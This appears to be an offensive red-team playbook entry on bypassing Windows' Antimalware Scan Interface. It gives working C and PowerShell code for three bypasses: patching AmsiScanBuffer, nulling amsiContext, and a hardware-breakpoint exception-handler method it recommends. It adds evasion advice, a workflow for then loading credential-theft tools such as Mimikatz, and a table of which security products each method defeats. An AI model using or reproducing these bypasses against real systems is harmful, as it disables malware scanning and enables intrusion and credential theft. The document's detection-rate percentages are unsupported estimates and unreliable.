# AMSI Bypass Techniques

## Technique ID: NOCTIS-T004

## Conceptual Understanding

### What is AMSI?

Antimalware Scan Interface (AMSI) is a Windows security feature that allows applications to request content scanning from installed antivirus engines. AMSI intercepts:

1. **PowerShell script execution** - All PowerShell commands are scanned before execution
2. **.NET assembly loads** - Dynamically loaded assemblies are inspected
3. **JavaScript/VBScript** - Windows Script Host content is scanned
4. **Office macro execution** - VBA macros are submitted for analysis

### Why Bypass AMSI?

**Red Team Benefits:**
- Execute malicious PowerShell without detection
- Load .NET assemblies containing offensive tools (Rubeus, Mimikatz)
- Run obfuscated scripts that AMSI signatures detect
- Bypass Windows Defender's script analysis engine

**Limitations:**
- Windows 11 24H2 has enhanced AMSI integrity checks
- Some bypasses are heavily signatured
- Memory patching can be detected by integrity monitoring
- Only bypasses AMSI, not other AV/EDR detections

### Common Bypass Methods

1. **Memory Patching**: Overwrite AmsiScanBuffer with return instruction
2. **DLL Hijacking**: Load malicious amsi.dll before legitimate one
3. **COM Hijacking**: Replace AMSI COM object registration
4. **Context Manipulation**: Corrupt amsiContext structure
5. **Hardware Breakpoints**: Use VEH to intercept AMSI calls (VEH²)

## Implementation Patterns

### Pattern 1: AmsiScanBuffer Memory Patching (Traditional)

**Concept**: Find AmsiScanBuffer in amsi.dll and overwrite first bytes with return instruction.

**Advantages**:
- Simple implementation
- Widely documented
- Works on older Windows versions

**Disadvantages**:
- Heavily signatured by EDRs
- **Fails on Windows 11 24H2** (AMSI integrity checks)
- Memory modification triggers behavior alerts
- Detection risk: 50-60%

**Code Pattern**:
```c
BOOL PatchAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

    // Overwrite with: xor eax, eax; ret (returns AMSI_RESULT_CLEAN)
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };

    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    return TRUE;
}
```

### Pattern 2: AmsiContext Corruption

**Concept**: Corrupt the amsiContext structure to make AMSI fail initialization.

**Advantages**:
- No memory patching of AMSI.dll
- Lower behavioral signature than patching

**Disadvantages**:
- Still modifies AMSI-related memory
- Can fail on some Windows versions
- Detection risk: 35-40%

**Code Pattern**:
```powershell
# PowerShell variant
$ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $ref.GetField('amsiContext', 'NonPublic,Static')
$field.SetValue($null, [IntPtr]0)
```

### Pattern 3: VEH² Hardware Breakpoint Bypass ⭐ RECOMMENDED

**Concept**: Register Vectored Exception Handler (VEH) and set hardware breakpoint on AmsiScanBuffer. When AMSI scan occurs, VEH intercepts the call and returns AMSI_RESULT_CLEAN without executing the actual scan.

**Critical Innovation**: **Zero memory patching** - AMSI.dll bytes remain untouched, defeating integrity checks on Windows 11 24H2.

**Advantages**:
- **Works on Windows 11 24H2** where memory patching fails
- No modification of AMSI.dll (bypasses integrity checks)
- Hardware breakpoints are transparent to memory scanners
- Uses legitimate Windows debugging APIs
- Detection risk: 20-25% (vs 50%+ for patching)

**Implementation Pattern**:
```c
// Global VEH context
PVOID g_pAmsiScanBuffer = NULL;

LONG WINAPI VEH_Handler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        PCONTEXT pContext = pExceptionInfo->ContextRecord;

        // Check if this is AmsiScanBuffer breakpoint
        if ((PVOID)pContext->Rip == g_pAmsiScanBuffer) {
            // Return AMSI_RESULT_CLEAN
            pContext->Rax = 0;
            pContext->Rip += 1; // Skip actual execution
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL VEH2_Initialize() {
    // Get AmsiScanBuffer address
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    g_pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

    // Register VEH handler
    AddVectoredExceptionHandler(1, VEH_Handler);

    // Set hardware breakpoint on AmsiScanBuffer using DR0
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    ctx.Dr0 = (DWORD64)g_pAmsiScanBuffer;
    ctx.Dr7 = 0x1; // Enable DR0 for execution breakpoint

    SetThreadContext(GetCurrentThread(), &ctx);
    return TRUE;
}
```

**How VEH² Works**:
1. Register Vectored Exception Handler for EXCEPTION_SINGLE_STEP
2. Set hardware breakpoint on amsi.dll!AmsiScanBuffer via debug register DR0
3. When PowerShell/CLR calls AmsiScanBuffer, CPU triggers exception
4. VEH handler catches exception, modifies RAX to 0 (AMSI_RESULT_CLEAN)
5. Execution resumes, AMSI reports clean result
6. **Zero bytes changed in amsi.dll** - passes all integrity checks

**Windows 11 24H2 Compatibility**: This is the **only reliable AMSI bypass** on Windows 11 24H2 as of 2024-2025. Memory patching techniques fail due to enhanced AMSI integrity validation.

## OPSEC Considerations

### Detection Vectors

1. **Memory Integrity Scanning**: Detects patched AMSI.dll (Pattern 1)
2. **Behavioral Analysis**: Unusual AMSI context access (Pattern 2)
3. **Kernel Callbacks**: Hardware breakpoint usage can be detected via kernel callbacks (Pattern 3)
4. **ETW Tracing**: AMSI ETW provider logs bypass attempts

### Evasion Improvements

1. **Combine with ETW patching** to disable AMSI event logging
2. **Use obfuscation** for PowerShell AMSI bypass scripts
3. **Implement process-specific bypass** (only patch in current process)
4. **Rotate bypass methods** based on target environment

## Integration with Other Techniques

### Complementary Techniques

- **Unhooking** (NOCTIS-T005): Restore clean NTDLL before AMSI bypass
- **ETW Patching**: Disable EtwEventWrite to prevent AMSI logging
- **In-Memory .NET Execution**: Load C# tools after AMSI bypass
- **PowerShell Runspace Manipulation**: Create unmonitored runspaces

### Example Workflow

```
1. Initialize VEH² hardware breakpoint bypass
2. Patch ETW to disable event logging
3. Execute PowerShell payload (AMSI returns clean)
4. Load .NET assembly (Rubeus/Mimikatz) via Assembly.Load()
5. Cleanup: Remove VEH handler and clear breakpoint
```

## Target AV/EDR Effectiveness

| Security Product | Memory Patching | AmsiContext | VEH² HW Breakpoint |
|-----------------|-----------------|-------------|-------------------|
| Windows Defender (Win10) | Medium | High | High |
| Windows Defender (Win11 24H2) | **Blocked** | Low | **High** |
| CrowdStrike Falcon | Low | Medium | Medium |
| Palo Alto Cortex XDR | Low | Medium | Medium |
| Carbon Black | Medium | Medium | High |
| SentinelOne | Low | Low | Medium |

**Note**: VEH² is the only method effective against Windows 11 24H2 built-in protections.

## Real-World Examples

### GitHub Projects
- **AmsiScanBufferBypass**: Classic memory patching method
- **AMSI.fail**: Collection of AMSI bypass techniques
- **VEH AMSI Bypass**: Hardware breakpoint implementations (search GitHub)

### Research Papers
- "Antimalware Scan Interface (AMSI) — A Developer's Perspective" (Microsoft)
- "AMSI Bypass Methods" (MDSec, RedOps)
- "Bypassing AMSI via COM Server Hijacking" (Modexp)

## Learning Resources

- **Blog Posts**:
  - CrowdStrike: "Patchless AMSI Bypass Attacks" (VEH² disclosure)
  - MDSec: "Exploring PowerShell AMSI and Logging Evasion"
  - RastaMouse: "AmsiScanBuffer Bypass"

- **Code Examples**:
  - GitHub: VEH-AMSI-Bypass repositories
  - Havoc C2: Integrated AMSI bypass implementations

- **Research**:
  - Black Hat MEA 2023 (VEH² presentation)
  - "The Rise and Fall of AMSI" (Offensive Security)

## Version-Specific Notes

- **Windows 10 1903-21H2**: Memory patching and context corruption effective
- **Windows 11 21H2-22H2**: Memory patching still works, context corruption varies
- **Windows 11 24H2**: **Memory patching BLOCKED**, VEH² is the only reliable method
- **Windows Server 2019/2022**: Similar to Windows 10 behavior

## Metadata

- **MITRE ATT&CK**: T1562.001 (Impair Defenses: Disable or Modify Tools)
- **Complexity**:
  - Memory Patching: Low
  - AmsiContext: Medium
  - VEH²: Medium-High
- **Stability**:
  - Memory Patching: Low (fails on Win11 24H2)
  - VEH²: High (cross-version compatible)
- **OPSEC Score**:
  - Memory Patching: 4/10 (heavily detected)
  - VEH²: 7.5/10 (stealthy, hardware breakpoints can be monitored)
